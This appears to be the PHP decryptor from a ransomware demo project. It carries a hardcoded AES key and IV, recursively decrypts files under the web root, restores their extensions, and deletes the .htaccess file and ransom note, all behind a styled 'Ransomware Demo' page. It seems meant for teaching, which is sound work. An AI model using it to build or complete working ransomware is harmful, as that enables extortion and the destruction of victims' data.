

<?php
error_reporting(0); //do not display errors
set_time_limit(0); //there is no runtime limit
ini_set('memory_limit', '-1'); //there is no memory limit

//create decryption key
$GLOBALS['method'] = "AES-256-CBC";
//ARIl0edI6SUQJaeK
$salt = base64_decode("ARIl0edI6SUQJaeK");
$passphrase = "07828c41768178cb7bf552550f014df0901499229db0c7c93cbcb24f0feacaae8f97a07cddab2835ac177d69800e0793d4d218d5341e0c04832e59db5a7ca3fa";
$key_length = 256;
$iterations = 1000;
$digest_algorithm = 'SHA512';
$GLOBALS['key'] = openssl_pbkdf2($passphrase, $salt, $key_length, $iterations, $digest_algorithm);
$GLOBALS['iv'] = base64_decode("LDJ9WTDRsTcL3uYjJhd2dw");

//start from the server root directory
$GLOBALS['root'] = $_SERVER['DOCUMENT_ROOT'];


#---------------------------------------------------------------------------------#
### {{ FUNCTIONS }} ###

### EXTENSION Retrieval ###
function retrieveExt($node){
    $name = substr($node, 0, -4);
    rename($node, $name);
}

### CONTENT Encryption Algorithm ###
function decryptFile($node){
    //get file content
    $content = file_get_contents($node);
    //echo $content;

    //decrypt file content
    $decrypted_content = openssl_decrypt($content, $GLOBALS['method'], $GLOBALS['key'], 0, $GLOBALS['iv']);
    //echo $decrypted_content;
  
    file_put_contents($node, $decrypted_content);

    //retrieve file extension
    retrieveExt($node);
}
//decryptFile("decrypthere.php");
### MAIN DECRYPTION FUNCTION ###
function iterate($root){
    $files = array_diff(scandir($root), array('.', '..'));

    foreach ($files as $file) {
        if($file !== basename($_SERVER['SCRIPT_FILENAME'],".php").".php" && $file != '' && $file != '.htaccess' ){
            $path = $root . '/' . $file;
            //echo $path;
            if (is_dir($path)) {
                iterate($path);
                retrieveExt($path);
            } else {
                decryptFile($path);
                
            }
        }
    }
}

#---------------------------------------------------------------------------------#

//iterate("/opt/lampp/htdocs/intern/decrypts/");
### RUN DECRYPTOR ###
if(isset($_POST['decrypt'])){
	//run decryption
	
	iterate("/opt/lampp/htdocs/php-ransomware-Demo/Encrypt");

	//delete .htaccess file
	unlink($GLOBALS['root'].'/.htaccess');

	//delete ransomnote file
	unlink($GLOBALS['root'].'/index1.php');

	//self-deletion
	//unlink($_SERVER['SCRIPT_FILENAME']);
}

?>

<!-- Decryption Form -->
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8">
		<title>Ransomware</title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<style>
			html {
				height: 100%;
			}
			body {
				background-color: #262626;
				display: flex;
				flex-direction: column;
				margin: 0;
				height: inherit;
				color: #F8F8F8;
				font-family:  Arial, Helvetica, sans-serif;
				font-size: 1em;
				font-weight: 400;
				text-align: left;
			}
			.front-form {
				display: flex;
				flex-direction: column;
				align-items: center;
				justify-content: center;
				flex: 1 0 auto;
				padding: 0.5em;
			}
			.front-form .layout {
				background-color: #000;
				padding: 1.5em;
				width: 50em;
				color: #000;
				border: 0.07em solid #000;
			}
			.front-form .layout header {
				text-align: center;
			}
			.front-form .layout header .title {
				color: #bf0a33;
				margin: 0;
				font-size: 3.5em;
				font-weight: 400;
			}
			.front-form .layout .about {
				text-align: center;
			}
			.front-form .layout .about p {
				margin: 1em 0;
				color: #fff;
				font-weight: 600;
				word-wrap: break-word;
			}
			.front-form .layout .about img {
				border: 0.07em solid #000;
			}
			.front-form .layout form {
				display: flex;
				flex-direction: column;
				margin-top: 1em;
			}
			.front-form .layout form input {
				-webkit-appearance: none;
				-moz-appearance: none;
				appearance: none;
				margin: 0;
				padding: 0.2em 0.4em;
				font-family: Arial, Helvetica, sans-serif;
				font-size: 1em;
				border: 0.07em solid #9D2A00;
				-webkit-border-radius: 0;
				-moz-border-radius: 0;
				border-radius: 0;
			}
			.front-form .layout form input[type="submit"] {
				background-color: #bf0a33;
				color: #F8F8F8;
				cursor: pointer;
				transition: background-color 220ms linear;
			}
			.front-form .layout form input[type="submit"]:hover {
				background-color: #bf0a33;
				transition: background-color 220ms linear;
			}
			.front-form .layout form .error {
				margin: 0 0 1em 0;
				color: #9D2A00;
				font-size: 0.8em;
			}
			.front-form .layout form .error:not(:empty) {
				margin: 0.2em 0 1em 0;
			}
			.front-form .layout form label {
				margin-bottom: 0.2em;
				height: 1.2em;
			}
            #passphrase{
                margin: 10px 0;
            }
			@media screen and (max-width: 480px) {
				.front-form .layout {
					width: 15.5em;
				}
			}
			@media screen and (max-width: 320px) {
				.front-form .layout {
					width: 14.5em;
				}
				.front-form .layout header .title {
					color: #bf0a33;
					font-size: 2.4em;
				}
				.front-form .layout .about p {
					font-size: 0.9em;
				}
			}
		</style>
	</head>
	<body>
		<div class="front-form">
			<div class="layout">
				<header>
					<h1 class="title">Ransomware Demo</h1>
				</header>
				<div class="about">
					<p>This is the decryption file of RAN<i style="color:red"></i></p>
					<p>You can simply click on <strong>Decrypt</strong> to retrieve your files</p>
					<p style="color:green">Hope you've enjoyed it :)</p>
				</div>
				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
					<input name="decrypt" for="decrypt" type="submit" value="Decrypt">
				</form>
			</div>
		</div>
	</body>
</html>